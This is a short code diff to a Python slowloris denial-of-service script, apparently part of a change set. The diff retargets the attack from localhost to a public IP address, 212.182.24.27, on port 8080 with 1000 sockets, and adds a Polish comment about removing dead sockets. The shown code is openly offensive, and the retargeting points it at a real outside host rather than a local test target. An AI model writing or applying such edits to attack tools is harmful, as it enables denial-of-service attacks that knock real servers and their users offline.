@@ -5,7 +5,7 @@ import time
 import logging
 import random
 
-HOST            = "127.0.0.1"
+HOST            = "212.182.24.27"
 PORT            = 8080
 SOCKET_COUNT    = 1000
 SLEEP_INTERVAL  = 100
@@ -67,6 +67,7 @@ def slowloris_attack() -> None:
             if not send_keepalive_header(sock):
                 dead.append(sock)
 
+        # Usuń martwe gniazda
         for sock in dead:
             sockets.remove(sock)
             try:
